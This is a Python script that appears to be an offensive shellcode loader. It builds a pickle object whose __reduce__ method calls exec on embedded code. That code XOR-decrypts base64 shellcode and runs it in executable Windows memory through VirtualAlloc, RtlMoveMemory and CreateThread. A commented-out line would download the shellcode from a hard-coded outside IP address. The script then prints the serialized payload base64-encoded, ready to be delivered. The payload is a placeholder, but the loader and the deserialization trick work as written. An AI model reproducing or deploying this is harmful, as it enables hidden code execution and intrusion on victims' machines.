import pickle
import pickletools
import os
import base64

sc = '''
import ctypes,base64,requests
#r = requests.get('http://116.85.16.53:8888/sc.txt')
#sc = r.content.strip()
sc = b'en-shellcode'
sc = base64.b64decode(sc)
sc = bytearray(sc)
key = [231, 77, 218, 229, 151, 122, 45, 207, 130, 75, 160, 246, 39, 165, 223, 53, 54, 83, 49, 192, 116, 35, 21, 84, 178, 227, 212, 247, 206, 61, 131, 83, 96, 14, 136, 137, 219, 103, 52, 81, 186, 34, 219, 72, 215, 229, 252, 37, 156, 207, 170, 214, 247, 78, 131, 248, 68, 231, 193, 92, 200, 38, 63, 200, 141, 111, 203, 211, 139, 98, 42, 79, 193, 43, 232, 6, 97, 74, 240, 198, 220, 134, 148, 62, 188, 51, 127, 232, 247, 76, 200, 12, 100, 39, 88, 176, 21, 161, 212, 73, 56, 255, 166, 154, 54, 82, 45, 184, 156, 98, 95, 39, 195, 84, 95, 202, 115, 7, 133, 137, 109, 234, 11, 149, 255, 128, 202, 176, 66, 145, 71, 131, 137, 35, 178, 23, 202, 154, 99, 32, 88, 133, 246, 65, 24, 55, 146, 171, 234, 246, 50, 114, 191, 255, 185, 179, 91, 152, 142, 188, 220, 53, 229, 249, 170, 167, 254, 170, 171, 244, 226, 58, 108, 153, 197, 248, 36, 178, 192, 181, 216, 45, 187, 98, 6, 151, 250, 56, 167, 86, 177, 230, 146, 81, 45, 91, 139, 42, 40, 219, 71, 175, 124, 193, 55, 14, 45, 108, 141, 255, 218, 215, 245, 182, 29, 209, 73, 184, 107, 248, 34, 247, 77, 244, 106, 235, 175, 40, 103, 154, 235, 194, 100, 107, 140, 222, 15, 83, 216, 246, 250, 43, 89, 171, 184, 8, 188, 75, 117, 123, 98, 34, 114, 196, 179, 167, 7, 200, 189, 178, 172, 195, 25, 194, 36, 202, 37, 217, 252, 6, 191, 232, 149, 230, 159, 107, 74, 100, 76, 206, 196, 154, 6, 204, 222, 46, 113, 52, 249, 35, 183, 104, 3, 166, 46, 202, 86, 99, 22, 157, 184, 234, 108, 226, 127, 33, 237, 12, 113, 214, 56, 167, 98, 168, 19, 154, 80, 85, 78, 100, 153, 177, 71, 136, 210, 246, 206, 245, 205, 84, 139, 29, 253, 202, 118, 91, 250, 241, 152, 222, 205, 81, 121, 169, 169, 152, 190, 174, 27, 214, 11, 81, 133, 79, 36, 235, 118, 117, 208, 251, 82, 203, 53, 130, 87, 49, 27, 148, 144, 138, 105, 93, 35, 92, 198, 207, 143, 175, 108, 165, 123, 73, 116, 121, 90, 193, 93, 20, 42, 95, 196, 72, 208, 197, 84, 83, 39, 57, 24, 144, 171, 57, 11, 239, 165, 120, 125, 103, 231, 121, 217, 177, 80, 185, 1, 197, 190, 195, 100, 168, 157, 4, 14, 118, 17, 122, 142, 178, 195, 230, 224, 218, 152, 67, 106, 213, 157, 29, 80, 232, 7, 2, 65, 106, 150, 6, 165, 152, 133, 94, 193, 62, 193, 207, 254, 239, 136, 98, 25, 210, 12, 108, 85, 31, 144, 198, 234, 44, 182, 114, 206, 243, 201, 124, 6, 27, 16, 160, 218, 180, 6, 128, 128, 189, 221, 149, 53, 224, 10, 20, 224, 89, 190, 1, 46, 106, 144, 53, 162, 158, 140, 8, 123, 113, 191, 64, 169, 171, 35, 12, 63, 130, 21, 150, 119, 31, 117, 24, 85, 134, 231, 72, 46, 28, 5, 182, 162, 89, 13, 54, 68, 198, 220, 109, 127, 180, 63, 206, 161, 204, 251, 6, 243, 94, 171, 54, 180, 175, 206, 219, 109, 241, 206, 12, 18, 19, 217, 51, 38, 39, 14, 46, 13, 135, 28, 21, 58, 65, 189, 57, 223, 111, 183, 19, 161, 76, 208, 200, 194, 187, 243, 253, 212, 61, 215, 44, 241, 247, 160, 4, 58, 36, 108, 143, 83, 204, 202, 160, 168, 88, 43, 47, 147, 118, 86, 136, 187, 80, 209, 170, 14, 206, 169, 17, 241, 160, 150, 74, 146, 29, 179, 180, 214, 126, 254, 126, 62, 211, 28, 186, 32, 13, 116, 126, 86, 50, 24, 6, 59, 74, 104, 128, 191, 48, 45, 29, 100, 217, 36, 13, 82, 76, 97, 148, 197, 23, 100, 128, 99, 229, 151, 153, 173, 211, 138, 95, 210, 36, 217, 224, 50, 123, 194, 15, 99, 20, 160, 251, 170, 199, 176, 147, 165, 37, 161, 12, 191, 239, 211, 194, 163, 228, 73, 15, 116, 251, 123, 144, 101, 112, 209, 31, 255, 171, 248, 56, 253, 115, 167, 187, 175, 175, 153, 157, 177, 134, 197, 214, 10, 157, 61, 250, 243, 3, 153, 40, 84, 211, 218, 161, 202, 207, 93, 89, 233, 225, 166, 185, 154, 202, 165, 6, 147, 14, 162, 176, 125, 253, 48, 179, 36, 161, 68, 120, 194, 188, 228, 188, 15, 36, 154, 245, 181, 6, 149, 94, 162, 17, 79, 23, 223, 65, 42, 102, 124, 92, 240, 60, 128, 204, 84, 100, 74, 219, 226, 245, 242, 252, 111, 21, 197, 78, 39, 31, 55, 170, 39, 180, 169, 230, 36, 229, 236, 52, 202, 149, 146, 154, 137, 240, 149, 235, 79, 143, 69, 47, 85, 203, 201, 151, 187, 58, 245, 24, 74, 162, 223, 6, 254, 182, 178, 227, 112, 98, 72, 11, 223, 5, 88, 72, 140, 207, 30, 14, 213, 238, 161, 199, 150, 72, 156, 4, 73, 47, 21, 77, 236, 204, 25, 236, 214, 225, 61, 77, 148, 79, 31, 143, 207, 16, 187, 107, 235, 91, 169, 89, 198, 27, 148, 212, 168, 25, 98, 65, 33, 70, 135, 251, 249, 157, 173, 235, 151, 115, 218, 39, 91, 211, 166, 208, 159, 229, 227, 3, 40, 147, 82, 197, 76, 128, 90, 31, 233, 189, 221, 241, 105, 117, 231, 87, 251, 151, 11, 44, 175, 81, 83, 55, 219]

i = 0
while i < len(sc):
    sc[i] = sc[i] ^ key[i]
    i += 1
shellcode = sc
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode)
                 )
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))  
'''
class Exp(object):
    def __reduce__(self):
        return (exec, (sc, ))

# 序列化code
def serialize():
    ob = Exp()
    se = pickle.dumps(ob)   # 序列化code
    se_base64 = base64.b64encode(se)    # 序列化后b64加密
    print(se_base64)
    '''
    se = base64.b64decode(se_base64)
    pickle.loads(se)
    '''

if __name__ == "__main__":
    serialize()
